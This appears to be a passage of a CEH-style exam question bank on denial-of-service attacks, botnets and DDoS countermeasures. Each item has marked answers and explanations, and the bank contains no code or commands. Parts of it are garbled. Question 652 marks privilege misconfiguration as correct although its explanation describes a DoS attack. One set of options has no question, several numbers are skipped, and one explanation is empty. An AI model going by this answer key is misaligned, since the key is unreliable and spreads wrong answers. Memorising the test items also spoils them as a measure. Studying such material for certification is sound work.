652. Gordon was not happy with the product that he ordered from an online retailer. He tried to contact the seller’s post purchase service desk, but they denied any help in this matter. Therefore, Gordon wants to avenge this by damaging the retailer’s services. He uses a utility named high orbit ion cannon (HOIC) that he downloads from an underground site to flood the retailer’s system with requests so that the retailer’s site was unable to handle any further requests even from legitimate users’ purchase requests. What type of attack is Gordon using?
+ [x] Gordon is taking advantage of an incorrect configuration that leads to access with higher-than-expected privilege
+ [ ] Gordon is executing commands or is viewing data outside the intended target path
+ [ ] Gordon is using poorly designed input validation routines to create and/or to alter commands so that he gains access to the secure data and execute commands
+ [ ] Gordon is using a denial-of-service attack
> **Explanation:**
> + DoS and distributed denial-of-service (DDoS) attacks have become a major threat to computer networks. These attacks attempt to make a machine or network resource unavailable to its authorized users.
> + In a DoS attack, an attacker overloads a system’s resources, thereby bringing the system down or at least significantly slowing the system’s performance. The goal of a DoS attack is not to gain unauthorized access to a system or to corrupt data; it is to keep away legitimate users from using the system.
> + HOIC is an open-source network stress testing and DoS attack application written in BASIC and designed to attack as many as 256 URLs at the same time.

653. Systems administrator in a company named “We are Secure Ltd.” has encountered with a problem where he suspects the possibility of a cyber attack over his company’s router. He observed that vast amount of network traffic is directed toward the network router, causing router CPU utilization to reach 100% and making it non-functional to legitimate users. What kind of attack is this?
+ [ ] Buffer overflow(BoF) attack
+ [ ] SQL injection (SQLi) attack
+ [x] DoS attack
+ [ ] MitM attack
> **Explanation:**
> In a DoS attack, the CPU utilization becomes 100% making the router and the Internet connection unusable. It is not MitM—MitM could produce similar issue (Internet being slow or inaccessible), but it will not raise CPU level to 100%. It is not BoF—BoF could be used to produce this kind of a behavior, but the end result is DoS. It is not SQLi—SQLi cannot produce such a behavior.

654. Marko is attacking John’s computer with a custom-made application that is sending a specially crafted packet to John’s computer after which John’s computer shows a blue screen. Marko repeats this process every 3 seconds. John’s computer is now under constant blue screen and reboots over and over again. This is an example of ____________.
+ [x] DoS attack
+ [ ] SYN flood attack
+ [ ] DDoS attack
+ [ ] Ping of death attack
> **Explanation:**
> The correct answer is “DoS attack” because only one computer is being used in the attack process, whereas for DDoS, more computers are supposed to be attacked. Ping of death and SYN flood attacks are specific examples of DoS and DDoS attacks.

655. A systems administrator in a small company named “We are Secure Ltd.” has a problem with their Internet connection. The following are the symptoms: the speed of the Internet connection is slow (so slow that it is unusable). The router connecting the company to the Internet is accessible and it is showing a large amount of SYN packets flowing from one single IP address. The company’s Internet speed is only 5 Mbps, which is usually enough during normal working hours. What type of attack is this?
+ [ ] MitM
+ [x] DoS
+ [ ] DDoS
+ [ ] DRDoS
> **Explanation:**
> Since the attack is coming from one single IP address, it is not a DDoS because all requests come from the same IP and it is not a DRDoS because of the SYN packets – in reflection attacks other type of packets will be used (answer that reflection device is sending to an initial request). It is not MitM – MitM does not have anything to do with DoS (at least not directly).

656. Jacob Hacker is a disgruntled employee and is fired from his position as a network engineer. He downloads a program outside the company that transmits a very small packet to his former company’s router, thus overloading the router and causing lengthy delays in operational service of his former company. He loads the program on a bunch of computers at several public libraries and executes them. What type of attack is this?
+ [ ] HTTP response-splitting attack
+ [ ] Man-in-the-middle attack
+ [ ] SSH Brute-Force attack
+ [x] DDoS attack
> **Explanation:**
> + **DDoS attack**: DDoS is the right answer since Jacob has used multiple public libraries to overload his former company’s router. DDoS represents a flood attack.
> + Man-in-the-middle attack: When two parties are communicating, a man-in-middle attack can take place, in which a third party intercepts a communication between the two parties without their knowledge.
> + HTTP Response-Splitting Attack: An HTTP response-splitting attack is a web-based attack in which the attacker tricks the server by injecting new lines into response headers, along with arbitrary code. It involves adding header response data into the input field so that the server splits the response into two responses. This type of attack exploits vulnerabilities in input validation.
> + SSH Brute Force Attack: Attackers use the SSH protocols to create an encrypted SSH tunnel between two hosts in order to transfer unencrypted data over an insecure network. Usually SSH runs on TCP port 22. In order to conduct an attack on SSH, the attacker scans the entire SSH server using bots (performs TCP port 22 port scan) to identify possible vulnerabilities.

657. What is the goal of a DDoS attack?
+ [ ] Create bugs in web applications
+ [ ] Exploit a weakness in the TCP stack
+ [x] Render a network or computer incapable of providing normal service
+ [ ] Capture files from a remote computer
> **Explanation:**
> In a DDoS attack, many applications overload the target browser or network with fake exterior requests that make the system, network, browser, or site slow, useless, disabled, or unavailable.


## Botnets
658. Which of the following scanning methods makes use of the information obtained from an infected machine to find new vulnerable machines in a target network?
+ [ ] Hit-list scanning
+ [ ] Random scanning
+ [x] Topological scanning
+ [ ] Permutation scanning
> **Explanation:**
> + **Topological Scanning**: This technique uses the information obtained from an infected machine to find new vulnerable machines. An infected host checks for URLs in the hard drive of a machine that it wants to infect. Subsequently, it shortlists URLs and targets, and it checks their vulnerability.
> + Permutation Scanning: In this technique, attackers share a common pseudorandom permutation list of IP addresses of all machines.
> + Hit-list Scanning: Through scanning, an attacker first collects a list of potentially vulnerable machines and then creates a zombie army. Subsequently, the attacker scans the list to find a vulnerable machine.
> + Random Scanning: In this technique, the infected machine (an attacker’s machine or a zombie) probes IP addresses randomly in the target network’s IP range and checks their vulnerability.

659. In one of the following scanning techniques, an attacker first collects a set of potentially vulnerable machines, then creates a zombie army, and finally scans these set to find a vulnerable machine. Which is this scanning technique?
+ [ ] Topological scanning
+ [ ] Local subnet scanning
+ [x] Hit-list scanning
+ [ ] Permutation scanning
> **Explanation:**
> + Topological Scanning: This technique uses the information obtained from an infected machine to find new vulnerable machines. An infected host checks for URLs in the hard drive of a machine that it wants to infect. Subsequently, it shortlists URLs and targets, and it checks their vulnerability.
> + Permutation Scanning: In this technique, attackers share a common pseudorandom permutation list of IP addresses of all machines.
> + **Hit-list Scanning:** Through scanning, an attacker first collects a list of potentially vulnerable machines and then creates a zombie army. Subsequently, the attacker scans the list to find a vulnerable machine.
> + Local Subnet Scanning: In this technique, an infected machine searches for new vulnerable machines in its local network, behind a firewall, by using the information hidden in the local addresses. Attackers use this technique in combination with other scanning mechanisms.

660. Mike works for a company “Fourth Rose Intl.” as the sales manager. He was sent to Las Vegas on a business trip to meet his clients. After the successful completion of his meeting, Mike went back to his hotel room, connected to the hotel Wi-Fi network and attended his other scheduled online client meetings through his laptop. After returning back to his office headquarters, Mike connects his laptop to the office Wi-Fi network and continues his work; however, he observes that his laptop starts to behave strangely. It regularly slows down with blue screening from time-to-time and rebooting without any apparent reason. He raised the issue with his system administrator. Some days later, the system administrator in Mike’s company observed the same issue in various other computers in his organization. Meanwhile, he has also observed that large amounts of unauthorized traffic from various IP addresses of “Fourth Rose Intl.” were directed toward organizational web server. Security division of the company analyzed the network traces and identified that Mike’s Laptop’s IP address has authorized and initiated other computers in the network to perform DDoS abuse over the organizational web server. They further identified a malicious executable backdoor file on Mike’s Laptop that connects to a remote anonymous computer. This remote computer is responsible for sending commands to Mike’s Laptop in order to initiate and execute DDoS attack over the organizational web server. In this case, Mike’s laptop was part of the_________?
+ [ ] IRC attack
+ [x] Botnet attack
+ [ ] Command-and-control (C&C) center
+ [ ] Bot attack
> **Explanation:**
> Mike’s computer got infected with a malicious botnet attack during his visit in Las Vegas. His laptop was acting like a Bot in the Botnet network, so in this, case, the correct answer is Botnet attack. It was connected to a remote C&C center which issues commands for executing attack, so it is not a part of C&C. It was not a part of the IRC attack—C&C could have been that.

661. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the client’s computer is called a ___________
+ [ ] Client
+ [ ] Botnet
+ [ ] Command and Control(C&C)
+ [x] Bot
> **Explanation:**
> Answer is Bot. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the client’s computer is called a Bot. A botnet is a collection of Bots; C&C is a remote computer bots receive commands from and Client is not used in this terminology.

662. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the network created with infected computers is called ___________
+ [ ] C&C
+ [x] Botnet
+ [ ] Bot
+ [ ] Bot area network (BAN)
> **Explanation:**
> The answer is Botnet. When a client’s computer is infected with malicious software which connects to the remote computer to receive commands, the network created with infected computers is called Botnet. Bot is a single computer in Botnet and C&C is a master server that instructs Bots what to do. BAN is a term that does not exist.

663. In which of the following attack techniques does the attacker use a SOCKS proxy to harvest email addresses from web pages or other sources?
+ [ ] Installing advertisement add-ons
+ [ ] Sniffing traffic
+ [x] Spamming
+ [ ] Google AdSense abuse
> **Explanation:**
> + Sniffing traffic: A packet sniffer observes the data traffic entering a compromised machine. It allows an attacker to collect sensitive information such as credit card numbers and passwords.
> + Google AdSense abuse: Some companies permit showing Google AdSense ads on their websites for economic benefits. Botnets allow an intruder to automate clicks on an ad, producing a percentage increase in the click queue.
> + Installing advertisement add-ons: Botnets can be used to perpetrate a “click fraud” by automating clicks.
> + **Spamming**: Attackers use a SOCKS proxy for spamming. They harvest email addresses from web pages or other sources.


## DoS/DDoS Attack Techniques, Tools, and Case Studies
664. Which of the following attacks is performed by an attacker before the DDoS vulnerabilities of a system have been patched or effective defensive mechanisms are implemented?
+ [ ] Peer-to-peer attack
+ [ ] Pulse-wave DDoS attack
+ [ ] Smurf attack
+ [x] Zero-day DDoS attack
> **Explanation:**
> + Smurf Attack: In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast network
> + Pulse wave DDoS attack: In a pulse wave DDoS attack, attackers send a highly repetitive, periodic train of packets as pulses to the target victim every 10 minutes, and each specific attack session can last for a few hours to days
> + Peer-to-peer attacks: Using peer-to-peer attacks, attackers instruct clients of peer-to-peer file sharing hubs to disconnect from their peer-to-peer network and to connect to the victim's fake website
> + **Zero-day DDoS attack**: A zero-day DDoS attack is delivered before the DDoS vulnerabilities of a system have been patched or effective defensive mechanisms are implemented

665. In which of the following attacks does an attacker use a combination of volumetric, protocol, and application-layer attacks to take down a target system or service?
+ [ ] Slowloris attack
+ [x] Multi-vector attack
+ [ ] HTTP GET/POST attack
+ [ ] Peer-to-peer attack
> **Explanation:**
> + Slowloris Attack: Slowloris is a DDoS attack tool used to perform layer-7 DDoS attacks to take down web infrastructure. It is distinctly different from other tools in that it uses perfectly legitimate HTTP traffic to take down a target server.
> + Peer-to-Peer Attack: A peer-to-peer attack is a form of DDoS attack in which the attacker exploits a number of bugs in peer-to-peer servers to initiate a DDoS attack.
> + **Multi-Vector Attack**: In multi-vector DDoS attacks, the attacker uses combinations of volumetric, protocol, and application layer attacks to take down the target system or service.
> + HTTP GET/POST Attack: HTTP attacks are layer-7 attacks. HTTP clients, such as web browsers, connect to a web server through HTTP to send HTTP requests, which can be either HTTP GET or HTTP POST. Attackers exploit these requests to perform DoS attacks.

666. Fiona, an attacker, targeted an organization to diminish their network bandwidth. In this process, she used an attack technique in which zombies send large volumes of traffic to the victim’s systems to exhaust the network, application, or service resources, thereby restricting access to legitimate employees.
	Which of the following types of attack did Fiona perform in the above scenario?
+ [ ] Amplification attack
+ [ ] Smurf attack
+ [ ] Peer-to-peer attack
+ [x] Flood attack
> **Explanation:**
> + Smurf Attack: In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast network
> + **Flood attack:** zombies send large volumes of traffic to the victim’s systems to exhaust the bandwidth of these systems.
> + Amplification attack: In an amplification attack, the attacker or zombies transfer messages to a broadcast IP address. This method amplifies malicious traffic that consumes the bandwidth of the victim’s systems.
> + Peer-to-peer attacks: Using peer-to-peer attacks, attackers instruct clients of peer-to-peer file sharing hubs to disconnect from their peer-to-peer network and to connect to the victim's fake website

667. Which of the following network attacks relies on sending an abnormally large packet size that exceeds TCP/IP specifications?
+ [ ] SYN flooding
+ [ ] TCP hijacking
+ [x] Ping of death
+ [ ] Smurf attack
> **Explanation:**
> + **Ping of death:** In a ping of death (PoD) attack, an attacker tries to crash, destabilize, or freeze the target system or service by sending malformed or oversized packets using simple ping command. For instance, the attacker sends a packet that has a size of 65,538 bytes to the target webserver. This size of the packet exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes.
> + SYN flooding: In an SYN attack, the attacker sends a large number of SYN requests to the target server (victim) with fake source IP addresses. The attack creates incomplete TCP connections that use up network resources.
> + TCP hijacking: TCP session hijacking allows attackers to take over an active session by bypassing the authentication process.
> + Smurf attack: In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast network. It makes all the hosts on the broadcast network to respond to the received ICMP ECHO requests.

668. Which of the following statements is not true for a SYN flooding attack?
+ [x] Attacker sends an ACK response to the SYN/ACK from the target server
+ [ ] In a SYN attack, the attacker exploits the three-way handshake method
+ [ ] Attacker sends a TCP SYN request with a spoofed source address to the target server
+ [ ] Tuning the TCP/IP stack will help reduce the impact of SYN attacks
> **Explanation:**
> In a SYN attack, the attacker exploits the three-way handshake method. First, the attacker sends a fake TCP SYN request to the target server, and when the server sends back a SYN/ACK in response to the client (attacker) request, the client never sends an ACK response. This leaves the server waiting to complete the connection.

669. Identify the type of a DoS attack where an attacker sends e-mails, Internet relay chats (IRCs), tweets, and posts videos with fraudulent content for hardware updates to the victim with the intent of modifying and corrupting the updates with vulnerabilities or defective firmware.
+ [ ] Ping of death attack
+ [x] Phlashing attack
+ [ ] Internet control message protocol (ICMP) flood attack
+ [ ] SYN flooding attack
> **Explanation:**
> Phlashing is a PDoS attack that exploits vulnerability in network-based firmware updates. Such an attack is currently theoretical but if performed could render the target device inoperable. This attack is also known as “bricking a system.”

670. Bob is frustrated with his competitor, Brownies Inc., and he decides to launch an attack that would result in severe financial losses to his competitor. He plans and executes his attack carefully at an appropriate moment. Meanwhile, Trent, an administrator at Brownies Inc., realized that their primary financial transaction server had been attacked. As a result, one of their pieces of network hardware is rendered unusable, and he needs to replace or reinstall it to resume services. This process involves human interaction to fix it. What kind of DoS attack has been best illustrated in the aforementioned scenario?
+ [ ] Bandwidth attack
+ [x] PDoS attack
+ [ ] Application-level flood attack
+ [ ] Peer-to-peer attack
> **Explanation:**
> + PDoS attacks, also known as phlashing, purely target hardware. PDoS attack damages the system and makes its hardware unusable for its original purpose until the user replaces or reinstalls it. Unlike the DDoS attack, a PDoS attack exploits security flaws in a device, thereby allowing the remote administration on the management interfaces of the victim’s hardware, such as printers, routers, or other networking devices.
> + This attack is quicker and is more destructive than the traditional DoS attack. It works with a limited number of resources, unlike a DDoS attack, in which attackers enforce a set of zombies onto a target.

671. Which of the following is considered to be a smurf attack?
+ [ ] An attacker sends a large amount TCP traffic with a spoofed source IP address
+ [ ] An attacker sends a large number of TCP connection requests with spoofed source IP address
+ [ ] An attacker sends a large number of TCP/user datagram protocol (UDP) connection requests
+ [x] An attacker sends a large amount of ICMP traffic with a spoofed source IP address
> **Explanation:**
> In a smurf attack, the attacker sends a large number of ICMP request frames with a spoofed source IP address to the victim’s machine. Options (b), (c), and (d) are incorrect.

672. Which of the following volumetric attacks technique transfers messages to the broadcast IP address in order to increase the traffic over a victim system and consuming his entire bandwidth?
+ [ ] Protocol attack
+ [ ] Application layer attacks
+ [x] Amplification attack
+ [ ] Flood attack
> **Explanation:**
> + An amplification attack engages the attacker or zombies to transfer messages to a broadcast IP address. This method amplifies malicious traffic that consumes victim systems’ bandwidth.
> + A flood attack just involves zombies sending large volumes of traffic to victim’s systems in order to clog these systems’ bandwidth.
> + Protocol attacks and application layer attacks are not volumetric attacks.

673. In which of the following attacks does the attacker spoofs the source IP address with the victim’s IP address and sends large number of ICMP ECHO request packets to an IP broadcast network?
+ [ ] Ping of death attack
+ [x] Smurf attack
+ [ ] UDP flood attack
+ [ ] SYN flood attack
> **Explanation:**
> In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends large number of ICMP ECHO request packets to an IP broadcast network. This causes all the hosts on the broadcast network to respond to the received ICMP ECHO requests. These responses will be sent to the victim’s machine since the IP address is spoofed by the attacker. This causes significant traffic to the actual victim’s machine, ultimately leading the machine to crash.

674. Identify the type of DDoS attack from the following diagram:
	![Image](D:\Notes\Certification Cources\EC-Council\CEHv12\Exam-Prep\CEHv12\03.png)
+ [x] Distributed reflection denial-of-service (DRDoS) attack
+ [ ] Peer-to-peer attack
+ [ ] Permanent denial-of-service attack
+ [ ] Phlashing attack
> **Explanation:**
> + A DRDoS attack, also known as a “spoofed” attack, involves the use of multiple intermediate and secondary machines that contribute to the actual DDoS attack against the target machine or application. The DRDoS attack exploits the TCP three-way handshake vulnerability.
> + This attack involves an attacker machine, intermediary victims (zombies), secondary victims (reflectors), and the target machine. The attacker launches this attack by sending requests to the intermediary hosts, which, in turn, reflects the attack traffic to the target.

675. Martha is a network administrator in a company named “Dubrovnik Walls Ltd.” She realizes that her network is under a DDoS attack. After careful analysis, she realizes that large amounts of UDP packets are being sent to the organizational servers that are present behind the “Internet facing firewall.”
	What type of DDoS attack is this?
+ [ ] Application layer attack
+ [ ] Protocol attack
+ [x] Volume (volumetric) attack
+ [ ] SYN flood attack
> **Explanation:**
> The answer is volume-based attack which includes UDP floods, ICMP floods, and other spoofed packet floods.

+ [ ] DRDoS attack
+ [ ] DNS amplification attack
+ [x] DDoS extortion attack
> **Explanation:**
> + DNS Amplification Attack: Recursive DNS query is a method of requesting DNS mapping. The query goes through DNS servers recursively until it fails to find the specified domain name to IP address mapping.
> + **DDoS Extortion Attack:** The DDoS extortion attack is also referred to as ransom DDoS (RDDoS). Herein, attackers threaten the target organizations with an DDoS attack and insist them to pay a specified ransom amount. The attacker either sends a ransom note or initiates a sample DDoS attack using a botnet on specific resources of the organizations to make them believe that the attack is real. Consequently, an email with a ransom or extortion note with the payment option, deadline, etc. is delivered to the victim and warns that the original attack can be launched at any moment
> + Wrapping Attack: A wrapping attack is performed during the translation of the SOAP message in the TLS layer, where attackers duplicate the body of the message and send it to the server as a legitimate user.
> + Distributed Reflection Denial-of-Service (DRDoS) Attack: A distributed reflection DoS (DRDoS) attack, also known as a “spoofed” attack, involves the use of multiple intermediary and secondary machines that contribute to a DDoS attack against a target machine or application.

681. A systems administrator in a small company named “We are Secure Ltd.” has a problem with their Internet connection. The following are the symptoms: The speed of the Internet connection is slow (so slow that it is unusable). The router connecting the company to the Internet is accessible and it is showing large amount of router solicitation messages from neighboring routers even though the router is not supposed to receive any of these messages. What type of attack is this?
+ [ ] DoS
+ [ ] DDoS
+ [x] DRDoS
+ [ ] MitM
> **Explanation:**
> The answer is DRDoS. A distributed reflection denial-of-service attack (DRDoS), also known as a “spoofed” attack, involves the use of multiple intermediary and secondary machines that contribute to the actual DDoS attack against the target machine or application. The DRDoS attack exploits the TCP three-way handshake vulnerability. This attack involves attacker machine, intermediary victims (zombies), secondary victims (reflectors), and the target machine. Attacker launches this attack by sending requests to the intermediary hosts, which in turn reflects the attack traffic to the target. It is not DoS or DDoS because the attack is being reflected. It is not MitM—MitM does not have anything to do with DoS (at least not directly).

682. Martha is a network administrator in a company named “Dubrovnik Walls Ltd.”. She realizes that her network is under a DDoS attack. After careful analysis, she realizes that a large amount of fragmented packets are being sent to the servers present behind the “Internet facing firewall.”
	What type of DDoS attack is this?
+ [ ] Volume (volumetric) attack
+ [ ] Application layer attack
+ [ ] SYN flood attack
+ [x] Protocol attack
> **Explanation:**
> The answer is protocol attack, which includes SYN floods, fragmented packet attacks, ping of death attack, smurf DDoS, teardrop attack, land attack, and so on. It is not volume-based attack, which includes UDP floods, ICMP floods, and other spoofed-packet floods. It is not application layer attack, which includes GET/POST floods, attacks that targets web server, application or OS vulnerabilities, Slowloris, and so on. It is not SYN flood attack since SYN flooding is a part of the protocol attack.

686. Edwards, a professional hacker, has targeted a Linux server hosted on the target organization’s network. To achieve his goal, he initiated sending multiple specially crafted packets to the server with a malformed maximum segment size (MSS). This forced the server’s buffer to exceed its sustainable limit, which led to a DoS attack.
	Which of the following attacks did Edwards perform in the above scenario?
+ [ ] Misconfigured AP attack
+ [ ] Agent smith attack
+ [x] TCP SACK panic attack
+ [ ] BlueBorne attack
> **Explanation:**
> + **TCP SACK Panic Attack:** TCP Selective Acknowledgment (SACK) panic attack is a remote attack vector in which attackers attempt to crash the target Linux machine by sending SACK packets with malformed maximum segment size (MSS). To achieve this, attackers send specially designed SACK packets in sequence to the target server by setting the MSS to the lowest value (48 bytes). The lowest MSS value increases the number of TCP segments that need to be retransmitted. This selective retransmission causes the socket buffer of the target server to exceed the limit of 17 segments. Thus, the socket buffer exceeds the limit and triggers integer overflow, causing a kernel panic that leads to DoS.
> + Misconfigured AP Attack: Most organizations spend significant amounts of time defining and implementing Wi-Fi security policies, but it may be possible for a client of a wireless network to change the security settings of an AP unintentionally. This, in turn, may lead to misconfigurations in APs.
> + Agent Smith Attack: Agent Smith attacks are carried out by luring victims into downloading and installing malicious apps designed and published by attackers in the form of games, photo editors, or other attractive tools from third-party app stores such as 9Apps.
> + BlueBorne Attack: A BlueBorne attack is performed on Bluetooth connections to gain access to and take full control of the target device.

687. Wiley, a hacker, aimed to crash his target John’s machine. For this purpose, he spoofed the source IP address with John’s IP address and sent many ICMP ECHO request packets to an IP broadcast network, causing all the hosts to respond to the received ICMP ECHO requests and ultimately crashing John’s machine.
	Which of the following attack techniques did Wiley utilize in the above scenario?
+ [ ] Slowloris attack
+ [x] Smurf attack
+ [ ] Pulse-wave DDoS attack
+ [ ] Zero-day DDoS attack
> **Explanation:**
> + **Smurf Attack:** In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast network. This causes all the hosts on the broadcast network to respond to the received ICMP ECHO requests. These responses are sent to the victim’s machine because the IP address was spoofed by the attacker, causing significant traffic to the victim’s machine and ultimately making it crash.
> + Pulse wave DDoS attack: In a pulse wave DDoS attack, attackers send a highly repetitive, periodic train of packets as pulses to the target victim every 10 minutes, and each specific attack session can last for a few hours to days
> + Zero-day DDoS attack: A zero-day DDoS attack is delivered before the DDoS vulnerabilities of a system have been patched or effective defensive mechanisms are implemented
> + Slowloris Attack: Slowloris is a DDoS attack tool used to perform layer-7 DDoS attacks to take down web infrastructure. It is distinctly different from other tools in that it uses perfectly legitimate HTTP traffic to take down a target server.

688. Martha is a network administrator in company named “Dubrovnik Walls Ltd.” She realizes that her network is under a DDoS attack. After careful analysis, she realizes that large amount of HTTP POST requests are being sent to the web servers behind the WAF. The traffic is not legitimate, since the web application requires workflow to be finished in order to send the data with the POST request, and this workflow data is missing. So, What type of DDoS attack is this?
+ [ ] SYN flood attack
+ [ ] Volume (volumetric) attack
+ [x] Application layer attack
+ [ ] Protocol attack
> **Explanation:**
> 

689. The DDoS tool created by anonymous sends junk HTTP GET and POST requests to flood the target, and its second version of the tool (the first version had different name) that was used in the so-called Operation Megaupload is called _______.
+ [ ] Pandora DDoS
+ [ ] BanglaDOS
+ [x] HOIC
+ [ ] Dereil
> **Explanation:**
> + HOIC is the successor of low orbit ion cannon (LOIC) (which was used in operation payback by anonymous), and it is the version that has some additional features like hiding attacker’s geolocation.
> + BanglaDOS, Dereil, and Pandora DDoS do not have direct connection with anonymous group.

690. Robert, a professional hacker, has launched a reflection attack on the target organization’s Microsoft Azure environment to downgrade its network capacity. For this purpose, he initiated sending a large number of spoofed UDP packets with fake IP addresses that resembled the source IP addresses to an intermediary server. The intermediary server started responding to all the source IP addresses at once causing legitimate users to wait for some time to receive the resources.
	Which of the following types of attacks did Robert launch in the above scenario?
+ [ ] MarioNet attack
+ [ ] DNS server hijacking
+ [x] DDoS attack
+ [ ] IRDP spoofing
> **Explanation:**
> + IRDP Spoofing: ICMP Router Discovery Protocol (IRDP) is a routing protocol that allows a host to discover the IP addresses of active routers on its subnet by listening to router advertisement and solicitation messages on its network. The attacker can add default route entries on a system remotely by spoofing router advertisement messages.
> + DNS Server Hijacking: In DNS server hijacking, an attacker compromises a DNS server and changes its mapping settings to redirect toward a rogue DNS server that would redirect the user’s requests to the attacker’s rogue server.
> + **DDoS Attack:** This UDP reflection attack initiated from a large number of spoofed UDP packets. The abused or spoofed UDP packets contained fake IP addresses that resembled the source IP address, which together amplified the attack size. The spoofed UDP packets were sent to the intermediary server, which started responding to the source IP addresses causing the service delay. The attack was aimed at creating havoc by overwhelming the target Azure network with massive volumes of traffic to downgrade the network capacity.
> + MarioNet Attack: MarioNet is a browser-based attack that runs malicious code inside the browser, and the infection persists even after closing or browsing away from the malicious web page through which the infection has spread.


## DoS/DDoS Protection Tools and Countermeasures
691. Which of the following techniques is similar to reverse engineering, helps identify the true source of an attack, and allows taking necessary steps to block further attacks?
+ [x] Packet traceback
+ [ ] Event log analysis
+ [ ] Zombie zapper
+ [ ] Traffic pattern analysis
> **Explanation:**
> + Traffic Pattern Analysis: Traffic pattern analysis can help network administrators to develop new filtering techniques for preventing attack traffic from entering or leaving their networks.
> + **Packet Traceback:** Packet traceback refers to tracing back attack traffic. It is similar to reverse engineering. In this method, the targeted victim works backward by tracing the packet to its source. Once the victim identifies the true source, they can take steps to block further attacks from that source by developing the necessary preventive techniques.
> + Event Log Analysis: Event log analysis helps in identifying the source of DoS traffic. This allows network administrators to recognize the type of DDoS attack or a combination of attacks used.
> + Zombie Zapper: When a company is unable to ensure the security of its servers and a DDoS attack starts, the network IDS notices the high volume of traffic, which indicates a potential problem. The targeted victim can run Zombie Zapper to stop packets from flooding the system.

692. What is the DoS/DDoS countermeasure strategy to at least keep the critical services functional?
+ [ ] Absorbing the attack
+ [ ] Shutting down the services
+ [x] Degrading services
+ [ ] Deflecting attacks
> **Explanation:**
> During an attack, if it is not possible to keep all the services functioning, then it is a good idea to keep at least the critical services functional. To do this, first, identify the critical services and then customize the network, systems, and application designs to cut down on the noncritical services. This may help you to keep the critical services functional.

693. Which algorithm does the “sequential change-point detection” technique use to identify and locate the DoS attacks?
+ [ ] BlackShades
+ [x] Cumulative sum
+ [ ] Obfuscation
+ [ ] Advanced encryption standard
> **Explanation:**
> + The cumulative sum control chart (CUSUM) is a sequential analysis technique developed by E. S. Page of the University of Cambridge. It is typically used in monitoring change detection. The sequential change-point detection technique filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate versus time. Change-point detection algorithms isolate changes in network traffic statistics and in traffic flow rate caused by attacks. If there is a drastic change in traffic flow rate, a DoS attack may be occurring. This technique uses Cumulative Sum (Cusum) algorithm to identify and locate the DoS attacks; the algorithm calculates deviations in the actual versus expected local average in the traffic time series. The sequential change-point detection technique identifies the typical scanning activities of the network worms.
> + Obfuscation is the obscuring of the intended meaning of communication by making the message difficult to understand, usually with confusing and ambiguous language. BlackShades is the name of a malicious Trojan horse used by hackers to control computers remotely. The Advanced Encryption Standard (AES) is a symmetric block cipher chosen by the U.S. Government to protect classified information and is implemented in software and hardware throughout the world to encrypt sensitive data.

694. Smith, a network security administrator, is configuring routers in his organization to protect the network from DoS attacks. Which router feature can he use to prevent SYN flooding effectively?
+ [x] TCP intercept
+ [ ] Egress filtering
+ [ ] Mac address filtering
+ [ ] Ingress filtering
> **Explanation:**
> + Ingress filtering protects against flooding attacks that originate from valid prefixes (IP addresses). Egress filtering scans the headers of IP packets going out of the network.
> + In the TCP intercept mode, the router intercepts the SYN packets sent by the clients to the server and matches with an extended access list. If there is a match, then on behalf of the destination server, the intercept software establishes a connection with the client. Similarly, the intercept software also establishes a connection with the destination server on behalf of the client. Once the two half connections are established, the intercept software combines them transparently.
> + Thus, the TCP intercept software prevents the attempts of fake connection from reaching the server. It acts as a mediator between the server and the client throughout the connection.
> + MAC address filtering allows you to define a list of devices and only allows those devices on your network.

695. Ivan works as security consultant at “Ask Us Intl.” One of his clients is under a large-scale volume-based DDoS attack, and they have to decide how to deal with the issue. They have some DDoS appliances that are currently not configured. They also have a good communication channel with providers, and some of the providers have fast network connections. In an ideal scenario, what would be the best option to deal with this attack. Bear in mind that this is a volume-based DDoS attack with at least 1 000 000 bots sending the traffic from the entire globe!
+ [ ] Filter the traffic at the company’s Internet facing routers
+ [x] Absorb the attack
+ [ ] Filter the traffic at the provider level
+ [ ] Block the traffic at the provider level
> **Explanation:**
> The answer is “Absorb the attack,” since this is a really large volume of traffic, and using additional capacity (DDoS appliances that are currently not configured) to absorb the attack. Most of the other options are not practically feasible. Blocking the traffic at the provider level is a viable option, but in this case, since the attack cannot be easily filtered (Since the traffic coming from the entire globe), this is not an apt solution. Filtering the traffic at the provider level is the same thing as blocking the traffic at the provider level, so this is not a correct answer and filtering the traffic at the company’s Internet facing routers option will not work because the traffic is already there, and in this case, it is impossible to do anything at the client’s site.

696. John’s company is facing a DDoS attack. While analyzing the attack, John has learned that the attack is originating from the entire globe, and filtering the traffic at the Internet Service Provider’s (ISP) level is an impossible task to do. After a while, John has observed that his personal computer at home was also compromised similar to that of the company’s computers. He observed that his computer is sending large amounts of UDP data directed toward his company’s public IPs.
	John takes his personal computer to work and starts a forensic investigation. Two hours later, he earns crucial information: the infected computer is connecting to the C&C server, and unfortunately, the communication between C&C and the infected computer is encrypted. Therefore, John intentionally lets the infection spread to another machine in his company’s secure network, where he can observe and record all the traffic between the Bot software and the Botnet. After thorough analysis he discovered an interesting thing that the initial process of infection downloaded the malware from an FTP server which consists of username and password in cleartext format. John connects to the FTP Server and finds the Botnet software including the C&C on it, with username and password for C&C in configuration file. What can John do with this information?
+ [ ] Deflect the attack
+ [ ] Mitigate the attack
+ [x] Neutralize handlers
+ [ ] Protect secondary victims
> **Explanation:**
> The correct answer is “neutralize handlers,” because with admin’s access to C&C John can stop the attack, disable the C&C software, and/or change the password to stop the DDoS attack on his company’s network. Deflect the attack and mitigate the attack are not the correct answers because in both these cases, he is literally stopping the attack. Protect secondary victims is not the correct answer because secondary victims are still infected.

697. Sarah is facing one of the biggest challenges in her career—she has to design the early warning DDoS detection techniques for her employer. She starts developing the detection technique which uses signal analysis to detect anomalies. The technique she is employing analyzes network traffic in terms of spectral components where she divides the incoming signals into various frequencies and analyzes different. Which DDoS detection technique is she trying to implement?
+ [ ] NetFlow detection
